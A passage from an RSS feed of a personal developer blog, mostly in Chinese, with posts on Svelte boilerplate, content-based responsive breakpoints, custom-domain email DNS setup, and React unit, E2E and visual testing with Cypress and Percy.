			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2020-05-19 What is boilerplate code?</h1>
            <hr>

            <p>终于理解了 Svelte 宣扬的第一条特性 “Build boilerplate-free components” 是什么意思。</p><blockquote class="tc-quote tc-big-quote"><p>boilerplate code，即编写大量和业务无关的代码。
</p></blockquote><p>如 React hook：</p><pre class="js hljs"><code><span class="hljs-keyword">const</span> [name, setName] = useState(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> [age, setAge] = useState(<span class="hljs-number">0</span>)
<span class="hljs-keyword">const</span> [address, setAddress] = useState(<span class="hljs-string">''</span>)

<span class="hljs-keyword">return</span> (
  &lt;div&gt;
    &lt;input value={name} onChange={(e) =&gt; setName(e.target.value)}&gt;
    &lt;input value={age} onChange={(e) =&gt; setAge(e.target.value)}&gt;
    &lt;input value={address} onChange={(e) =&gt; setAddress(e.target.value)}&gt;
  &lt;/div&gt;
)</code></pre><p>其实 setName 和 onChange 等函数完全和业务无关，单纯是为了 React 语法而已。</p><p>所以 Svelte 提供 binding 语法</p><pre class="js hljs"><code>&lt;script&gt;
let name = ''
let age = 0
let address = ''
&lt;/script&gt;

&lt;input value={name}&gt;
&lt;input type=number value={age}&gt;
&lt;input value={address}&gt;</code></pre><p>那种编写方法更容易？一目了然</p><h2 class="">类比：</h2><ul><li>读取文件也是 boilerplate，你必须确认 file 存在，读取完毕后还必须关闭 file。</li><li>RESTful API 也是 boilerplate，CURD 写到吐。难怪 Ruby on Rails 会那么人气。开发者救星啊！！！</li></ul><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://svelte.dev/" rel="noopener noreferrer" target="_blank">https://svelte.dev/</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 23:11:37 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2020-05-19-what-is-boilerplate-code-</guid>      
   </item>

   <item>
      <title>2020-04-22 How to decide Responsive Design break point?</title>
      <link>https://thaddeusjiang.com/2020-04-22-how-to-decide-responsive-design-break-point-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2020-04-22 How to decide Responsive Design break point?</h1>
            <hr>

            <p>这可能是一个事实。</p><p>绝大多数 Web 项目使用 <code>实际设备宽度</code> 作为 Responsive Design 的 break point。</p><p>虽然不知道具体原因是为什么，但是极有可能和 Bootstrap 流行有关。因为 Bootstrap 就使用实际设备（Apple's）的宽度作为 Gird 布局的 break point。</p><p><img src="https://i.gyazo.com/0f746f3b84be7dcb33c510cc82eedbb6.jpg"></p><p>个人认为这种设计只适合通用 framework，并不是银弹。</p><h2 class="">让我们一起看一个实际需求</h2><p>现在我们需要开发一个列表展示页面。</p><p>要求：</p><blockquote class="tc-quote"><p>卡片宽度为 200px，卡片间隔 40px。
并且手机单列显示，平板或电脑多列显示。</p></blockquote><p>实际效果大致如下：</p><p><img src="https://i.gyazo.com/3c1f4fe292375cf6c1c8944de943f92b.jpg"></p><p>如果我们以设备宽度为break point，我们写出如下代码：</p><pre class="css hljs"><code><span class="hljs-selector-class">.list</span>{
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: column;
  <span class="hljs-attribute">align-items</span>: center;
}

<span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width:</span> <span class="hljs-number">768px</span>) {
  <span class="hljs-selector-class">.list</span> {
    <span class="hljs-attribute">flex-direction</span>: row;
    <span class="hljs-attribute">flex-wrap</span>: wrap;
    <span class="hljs-attribute">justify-content</span>: center;
  }
}

<span class="hljs-selector-class">.item</span> {
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000</span>;
}</code></pre><p>此时，如果你使用 iPad 进行测试，很幸运，你会发现一切正常。</p><p>但是，如果你使用 Android 设备去测试，那你可能就要祈祷上帝了。因为 Android 设备的宽度相当任性，你可能遇到宽度为 <code>767px</code> 的设备。</p><p>如果是设备宽度是 767px，上面的代码会如何显示呢？</p><p>结果如下：</p><p><img src="https://i.gyazo.com/d78f49274be9ae18947f60d157065298.jpg"></p><p>页面从 3 列突然变到 1 列</p><h2 class="">为什么会这样呢？</h2><p>因为上面代码存在一个严重的问题，即 Responsive Design 的 break point 和页面展示内容脱节。
它是基于设备的宽度决定的。</p><h2 class="">正确的做法</h2><blockquote class="tc-quote tc-big-quote"><p>基于内容决定 break point，将内容变化点作为 break point。
</p></blockquote><h2 class="">基于内容选取 break point</h2><p>同样的要求：</p><blockquote class="tc-quote"><p>卡片宽度为 200px，卡片间隔 40px。
并且手机单列显示，平板或电脑多列显示。
</p></blockquote><p>基于内容，我们可以得出页面从单列到多列的变化点是 <code>440px</code>。</p><pre><code>440px = 200px + 40px + 200px</code></pre><p>为了给页面边距预留一些留白，我们将 break point 设置 <code>480px</code>，CSS 如下：</p><pre class="css hljs"><code><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width:</span> <span class="hljs-number">480px</span>) {
  <span class="hljs-selector-class">.list</span> {
    <span class="hljs-attribute">flex-direction</span>: row;
    <span class="hljs-attribute">flex-wrap</span>: wrap;
    <span class="hljs-attribute">justify-content</span>: center;
  }
}</code></pre><p>看一下实际效果</p><p><img src="https://i.gyazo.com/8d8dbd82023553af0a8c3939bfc59ee8.gif"></p><h2 class="">总结</h2><blockquote class="tc-quote tc-big-quote"><p>Responsive Design 应该基于内容，而不是设备。
</p></blockquote><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://getbootstrap.com/" rel="noopener noreferrer" target="_blank">https://getbootstrap.com/</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 23:4:23 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2020-04-22-how-to-decide-responsive-design-break-point-</guid>      
   </item>

   <item>
      <title>2019-11-26 配置自定义域名邮箱</title>
      <link>https://thaddeusjiang.com/2019-11-26–pei-zhi-zi-ding-yi-yu-ming-you-xiang</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-11-26 配置自定义域名邮箱</h1>
            <hr>

            <p>绝大多数 freelancer 都使用自定义域名邮箱。一方面，使用自定义域名邮箱显得更专业，另一方面，可以有效隔绝生活邮件和工作邮件。本文简单介绍一下如何配置自己的自定义域名邮箱。</p><h2 class="">背景</h2><p>最近计划开始从事 freelancer 的工作。在网上查了一下，看到使用自定义域名邮箱可以提高客户的信任感，所以开始重度使用自己 <code>@jifa.name</code> 邮箱。</p><p>在此之前 <code>@jifa.name</code> 使用 Yandex Connect 搭建，搭建方法分享在 StackOverflow ，因为只使用它做必要的备份和验证使用，并没有发现问题。</p><p>但是随着邮件来往增多，我发现我不能及时回复邮件了。错误提示如下：</p><p><img src="https://i.gyazo.com/3e67d941bd9c0c99faabf1bf42f19239.png"></p><p>尝试了很多解决方案，但是都没解决。并且发现 yandex 的英文界面经常出现俄语，实在太难受了。
不得已，决定从 Yandex Connect 迁移到 Zoho Mail。</p><h2 class="">为什么选择 Zoho Mail</h2><ol><li>zoho mail 免费</li><li>zoho mail 英文支持好，不会出现不认识的按钮或者菜单</li><li>我以前应哟 Zoho notebook，对 Zoho 的软件有一定好感。</li></ol><h2 class="">如何设置？</h2><p>首先，介绍几点前提：</p><ul><li>我的域名是从 [GoDaddy](<a class="tc-tiddlylink-external" href="https://godaddy.com" rel="noopener noreferrer" target="_blank">https://godaddy.com</a>) 购买的</li><li>我是用 [Netlify](<a class="tc-tiddlylink-external" href="https://app.netlify.com/" rel="noopener noreferrer" target="_blank">https://app.netlify.com/</a>) 管理 DNS，而不是 GoDaddy。</li></ul><h2 class="">第一步：使用 Netlify 管理 DNS</h2><p>你可以在你的 Netlify Domain 页面添加一个 Domain</p><p><img src="https://i.gyazo.com/18c08519a8c4709c405ae9136b6c9fc4.jpg"></p><p>然后点进你的 Domain，你可以在 <code>Nameservers</code> 获得 Netlify 的 DNS zoon</p><p><img src="https://i.gyazo.com/2fb312d51ddb698f9ebac2d7ceb0b8ce.jpg"></p><p>到 GoDaddy 的 DNS 页面替换到原来的 DNS zoon
<img src="https://i.gyazo.com/17f31adf9ad6ab40387549d501511e40.jpg"></p><h2 class="">第二步：配置 MX 记录</h2><p>我的配置如下：</p><p><img src="https://i.gyazo.com/c50be634fd0f2e2a256a2d32d99706ac.jpg"></p><h2 class="">第三步：配置 TXT 记录</h2><p>需要配置 3 条 TXT 记录，分别是 <code>SPF</code> <code>DKIM</code> <code>DMARC</code>，关于他们的作用，简单地说就是为了防止你的邮件被当成垃圾邮件。</p><ul><li>SPF</li></ul><p><img src="https://i.gyazo.com/77ade364fab39dcc08ee5ef111f36d1d.jpg"></p><ul><li>DKIM</li></ul><p><img src="https://i.gyazo.com/2814987ef32778632f803b5a1b15f4e1.jpg"></p><ul><li>DMARC</li></ul><p><img src="https://i.gyazo.com/e79dd5bf2ce6f472a97c4a4cfa378b9c.jpg"></p><p>到此位置，你已经配置好自己的自定义域名邮箱了。
接下来就是使用你狂拽酷炫的邮件地址收发邮件了。</p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://connect.yandex.com/" rel="noopener noreferrer" target="_blank">https://connect.yandex.com/</a></li><li><a class="tc-tiddlylink-external" href="https://stackoverflow.com/a/56238722/5847276" rel="noopener noreferrer" target="_blank">https://stackoverflow.com/a/56238722/5847276</a></li><li><a class="tc-tiddlylink-external" href="https://www.zoho.com/mail/" rel="noopener noreferrer" target="_blank">https://www.zoho.com/mail/</a></li><li><a class="tc-tiddlylink-external" href="https://zh.wikipedia.org/wiki/MX" rel="noopener noreferrer" target="_blank">https://zh.wikipedia.org/wiki/MX</a>记录</li><li><a class="tc-tiddlylink-external" href="https://en.wikipedia.org/wiki/TXT_record" rel="noopener noreferrer" target="_blank">https://en.wikipedia.org/wiki/TXT_record</a></li><li><a class="tc-tiddlylink-external" href="http://lomu.me/post/SPF-DKIM-DMARC-PTR" rel="noopener noreferrer" target="_blank">http://lomu.me/post/SPF-DKIM-DMARC-PTR</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 22:51:14 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-11-26–pei-zhi-zi-ding-yi-yu-ming-you-xiang</guid>      
   </item>

   <item>
      <title>2019-11-20 React Testing 3 - Visual Testing</title>
      <link>https://thaddeusjiang.com/2019-11-20-react-testing-3—visual-testing</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-11-20 React Testing 3 - Visual Testing</h1>
            <hr>

            <blockquote class="tc-quote tc-big-quote"><p>Visual Testing 是我所接触的测试方法中最直观的，也是效果最明显的。
</p></blockquote><h2 class="">1. 什么是 Visual Testing？</h2><p>简单的说，Visual Testing 就是从视觉效果上测试。
更加全面的解释，参见 《What is Visual Testing? A comprehensive explanation》</p><h2 class="">为什么要使用 Visual Testing 呢？</h2><p>最简单的原因就是快速，直观，不易遗漏。</p><h2 class="">2. 如何做 Visual Testing？</h2><p>Percy.io 是一个性价比高的 Visual Testing 平台，对个人项目或者小团队非常实用。</p><p>Percy 提供多种集成方式，本文中选择从 E2E Testing 集成 Visual Testing。</p><p>1. 安装 <code>@percy/cypress</code></p><pre class="bash hljs"><code>yarn add --dev @percy/cypress</code></pre><p>2. 在 <code>cypress/support/commands.js</code> 添加 <code>@percy/cypress</code></p><pre class="js hljs"><code><span class="hljs-comment">// At the top of cypress/support/commands.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"@percy/cypress"</span></code></pre><p>3. 在 <code>cypress/plugins/index.js</code> 添加 <code>percyHealthCheck</code></p><pre class="js hljs"><code><span class="hljs-comment">// In cypress/plugins/index.js</span>
<span class="hljs-keyword">let</span> percyHealthCheck = <span class="hljs-built_in">require</span>(<span class="hljs-string">"@percy/cypress/task"</span>)

<span class="hljs-built_in">module</span>.exports = <span class="hljs-function">(<span class="hljs-params">on, config</span>) =&gt;</span> {
  on(<span class="hljs-string">"task"</span>, percyHealthCheck)
}</code></pre><p>4. 在 Cypress 测试代码中添加 Percy 　代码</p><pre class="js hljs"><code><span class="hljs-comment">// cypress/integration/login.js</span>
it(<span class="hljs-string">"visual testing for login page"</span>, () =&gt; {
  cy.visit(<span class="hljs-string">"/login"</span>)
  cy.percySnapshot()
})</code></pre><p>5. 登陆 [Percy](<a class="tc-tiddlylink-external" href="https://percy.io/" rel="noopener noreferrer" target="_blank">https://percy.io/</a>) 新建项目，并获得 Token</p><p><img src="https://i.gyazo.com/99015684ec24f10d7e5e08839e6a568c.jpg"></p><p>6. 通过 Percy 启动 Cypress</p><pre class="bash hljs"><code>$ PERCY_TOKEN=xxx percy <span class="hljs-built_in">exec</span> -- cypress run</code></pre><h2 class="">3. 常见问题</h2><p>1. 如何自动化测试</p><p>以 GitHub Actions 为例：</p><p>第一步：定义 npm scripts</p><pre class="json hljs"><code>// package.json
"scripts": {
  "start": "react-scripts start",
  "build": "react-scripts build",
  "test": "react-scripts test",
  "cy:open": "cypress open",
  "start-server": "npm start",
++  "cy:record": "percy exec -- cypress run --record",
  "cy:ci": "start-server-and-test start-server http://localhost:3000 cy:record"
},</code></pre><p>第二步： 定义 <code>.github/workflows/pull_request.yml</code></p><pre class="yaml hljs"><code><span class="hljs-attr">name:</span> <span class="hljs-string">"PR Checks"</span>

<span class="hljs-attr">on:</span> <span class="hljs-string">pull_request</span>

<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">test:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">E2E</span> <span class="hljs-string">Tests</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">out</span> <span class="hljs-string">code</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span>

      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">dependencies</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">yarn</span> <span class="hljs-string">install</span> <span class="hljs-string">--non-interactive</span> <span class="hljs-string">--no-progress</span> <span class="hljs-string">--frozen-lockfile</span> <span class="hljs-string">--ignore-optional</span>

      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">E2E</span> <span class="hljs-string">Tests</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">yarn</span> <span class="hljs-string">cy:ci</span>
        <span class="hljs-attr">env:</span>
          <span class="hljs-attr">CYPRESS_RECORD_KEY:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.CYPRESS_RECORD_KEY</span> <span class="hljs-string">}}</span>
<span class="hljs-string">++</span>          <span class="hljs-attr">PERCY_TOKEN:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.PERCY_TOKEN</span> <span class="hljs-string">}}</span></code></pre><p>source code： <a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/react-testing-example/pull/3" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/react-testing-example/pull/3</a></p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://percy.io" rel="noopener noreferrer" target="_blank">https://percy.io</a></li><li><a class="tc-tiddlylink-external" href="https://docs.percy.io/docs/cypress" rel="noopener noreferrer" target="_blank">https://docs.percy.io/docs/cypress</a></li><li>《What is Visual Testing? A comprehensive explanation.》 <a class="tc-tiddlylink-external" href="https://applitools.com/blog/visual-testing" rel="noopener noreferrer" target="_blank">https://applitools.com/blog/visual-testing</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 22:43:37 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-11-20-react-testing-3—visual-testing</guid>      
   </item>

   <item>
      <title>2019-11-19 React Testing 2 - E2E Testing</title>
      <link>https://thaddeusjiang.com/2019-11-19-react-testing-2—e2e-testing</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-11-19 React Testing 2 - E2E Testing</h1>
            <hr>

            <p>相信很多开发者都听过 E2E Testing，我有幸在两个项目中负责了 E2E Testing 的搭建和维护。这里分享一下如何 E2E Testing。</p><h2 class="">1. 什么是 E2E Testing？</h2><blockquote class="tc-quote tc-big-quote"><p>笔者认为：E2E Testing 就是从用户角度对软件进行测试。
</p></blockquote><p>例如：进入“登陆界面”，输入用户名和密码，点击登陆后跳转到“登陆成功”界面。</p><h2 class="">2. 如何做 E2E Testing？</h2><p>很幸运，在 E2E Testing 方面，已经有很多开源软件可以使用。
推荐 Cypress</p><p>1. 安装并配置 Cypress</p><pre class="bash hljs"><code>yarn add cypress --dev

yarn cypress open</code></pre><p>第一次运行 <code>cypress open</code>，Cypress 会自动生成测试目录和基本配置。如：</p><pre><code>├── cypress
│   └── fixtures
│   └── integration
│   └── plugins
│   └── support</code></pre><p>2. 编写一个登陆界面，并测试</p><p>我们约定路由如下：</p><ul><li><code>/login</code> 登陆界面</li><li><code>/</code> 主页面</li></ul><pre class="js hljs"><code><span class="hljs-comment">// 登陆界面</span>
<span class="hljs-comment">// src/modules/login/index.js</span>
<span class="hljs-keyword">import</span> React, { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>
<span class="hljs-keyword">import</span> { navigate } <span class="hljs-keyword">from</span> <span class="hljs-string">"@reach/router"</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Login</span>(<span class="hljs-params"></span>) </span>{
  <span class="hljs-keyword">const</span> [username, setUsername] = useState(<span class="hljs-string">""</span>)
  <span class="hljs-keyword">const</span> [password, setPassword] = useState(<span class="hljs-string">""</span>)

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">htmlFor</span>=<span class="hljs-string">"username"</span>&gt;</span>Username:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
          <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>
          <span class="hljs-attr">id</span>=<span class="hljs-string">"username"</span>
          <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span>
          <span class="hljs-attr">value</span>=<span class="hljs-string">{username}</span>
          <span class="hljs-attr">onChange</span>=<span class="hljs-string">{e</span> =&gt;</span> setUsername(e.target.value)}
        /&gt;
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">htmlFor</span>=<span class="hljs-string">"password"</span>&gt;</span>Password:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
          <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span>
          <span class="hljs-attr">id</span>=<span class="hljs-string">"password"</span>
          <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span>
          <span class="hljs-attr">value</span>=<span class="hljs-string">{password}</span>
          <span class="hljs-attr">onChange</span>=<span class="hljs-string">{e</span> =&gt;</span> setPassword(e.target.value)}
        /&gt;
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

      <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
          if (username === "jifa" &amp;&amp; password === "password") {
            navigate("/")
          }
        }}
      &gt;
        Login
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}</code></pre><pre class="js hljs"><code><span class="hljs-comment">// 测试代码</span>
<span class="hljs-comment">// cypress/integration/login.js</span>
<span class="hljs-comment">/// &lt;reference types="Cypress" /&gt;</span>

describe(<span class="hljs-string">"Login Page"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
  before(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
    cy.fixture(<span class="hljs-string">"user"</span>).as(<span class="hljs-string">"user"</span>)
  })

  it(<span class="hljs-string">"fill username and password, login"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
    cy.visit(<span class="hljs-string">"/login"</span>)

    cy.get(<span class="hljs-string">'input[name="username"]'</span>).type(<span class="hljs-keyword">this</span>.user.username)
    cy.get(<span class="hljs-string">'input[name="password"]'</span>).type(<span class="hljs-keyword">this</span>.user.password)

    cy.get(<span class="hljs-string">'button[type="submit"]'</span>).click()

    cy.contains(<span class="hljs-string">"HOME"</span>)
  })
})</code></pre><pre class="json hljs"><code><span class="hljs-comment">// 测试数据</span>
<span class="hljs-comment">// cypress/fixtures/user.json</span>
{
  <span class="hljs-attr">"username"</span>: <span class="hljs-string">"jifa"</span>,
  <span class="hljs-attr">"password"</span>: <span class="hljs-string">"password"</span>
}</code></pre><p>运行测试</p><pre class="bash hljs"><code>yarn cypress open</code></pre><p>这时 Cypress 会启动如下窗口，点击测试文件即可开始测试。</p><p><img src="https://i.gyazo.com/2ce8aa2c6788c5076bbeac6c1c6e71af.jpg"></p><h2 class="">3. 常见问题</h2><p>1. 如何自动补全 Cypress 方法？</p><p>在测试文件内添加如下代码：</p><pre class="js hljs"><code><span class="hljs-comment">/// &lt;reference types="Cypress" /&gt;</span></code></pre><p>2. <code>cy undefined</code>，如何解决？</p><p>安装 [eslint-plugin-cypress](<a class="tc-tiddlylink-external" href="https://github.com/cypress-io/eslint-plugin-cypress" rel="noopener noreferrer" target="_blank">https://github.com/cypress-io/eslint-plugin-cypress</a>)，并配置 <code>eslintrc.json</code></p><pre class="bash hljs"><code>yarn add --dev eslint-plugin-cypress</code></pre><pre class="json hljs"><code><span class="hljs-comment">// eslintrc.json</span>
{
  <span class="hljs-attr">"plugins"</span>: [<span class="hljs-string">"cypress"</span>]
}</code></pre><p>3. 如何自动化测试？</p><p>以 GitHub Actions 为例：</p><p>第一步：定义 npm scripts</p><pre class="json hljs"><code>// package.json
"scripts": {
  "start": "react-scripts start",

  "start-server": "npm start",
  "cy:record": "cypress run --record",
  "cy:ci": "start-server-and-test start-server http://localhost:3000 cy:record"
}</code></pre><p>第二步： 定义 <code>.github/workflows/pull_request.yml</code></p><pre class="yaml hljs"><code><span class="hljs-attr">name:</span> <span class="hljs-string">"PR Checks"</span>

<span class="hljs-attr">on:</span> <span class="hljs-string">pull_request</span>

<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">test:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">E2E</span> <span class="hljs-string">Tests</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">out</span> <span class="hljs-string">code</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span>

      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">dependencies</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">yarn</span> <span class="hljs-string">install</span> <span class="hljs-string">--non-interactive</span> <span class="hljs-string">--no-progress</span> <span class="hljs-string">--frozen-lockfile</span> <span class="hljs-string">--ignore-optional</span>

      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">E2E</span> <span class="hljs-string">Tests</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">yarn</span> <span class="hljs-string">cy:ci</span>
        <span class="hljs-attr">env:</span>
          <span class="hljs-attr">CYPRESS_RECORD_KEY:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.CYPRESS_RECORD_KEY</span> <span class="hljs-string">}}</span></code></pre><p>需要在 GitHub Secrets 定义 <code>CYPRESS_RECORD_KEY</code>，如下：</p><p><img src="https://i.gyazo.com/825570ffe09b2d6ff69f7b546ba1733d.jpg"></p><h2 class="">经验</h2><blockquote class="tc-quote tc-big-quote"><p>其实可以全局安装 Cypress
</p></blockquote><p>优点是缩短 npm 安装时间。</p><p>代码：<a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/react-testing-example/pull/2" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/react-testing-example/pull/2</a></p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://www.cypress.io/" rel="noopener noreferrer" target="_blank">https://www.cypress.io/</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 22:38:18 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-11-19-react-testing-2—e2e-testing</guid>      
   </item>

   <item>
      <title>2019-11-18 React Testing 1 - Unit Testing</title>
      <link>https://thaddeusjiang.com/2019-11-18-react-testing-1—unit-testing</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-11-18 React Testing 1 - Unit Testing</h1>
            <hr>

            <blockquote class="tc-quote tc-big-quote"><p>软件测试中，Unit Testing 是最基础的，也是测试量最大的。
</p></blockquote><p>那么，React 项目如何 Unit Testing呢？</p><p>首先，我们要先确定几个前提</p><ul><li>使用 create-react-app 创建项目</li><li>使用 Jest 和 React Testing Library 测试</li><li>使用 GitHub Actions 自动化</li></ul><h2 class="">1. 创建项目，并配置 Jest 和 React Testing Library</h2><pre class="bash hljs"><code>npx create-react-app testing-demo

<span class="hljs-built_in">cd</span> testing-demo
yarn add @testing-library/react --dev
</code></pre><h2 class="">2. 编写一个 Counter 组件，并测试</h2><blockquote class="tc-quote tc-big-quote"><p>Tips: 测试代码和组件放在同一文件夹下，更易管理。
</p></blockquote><pre class="js hljs"><code><span class="hljs-comment">// src/components/counter/index.js</span>
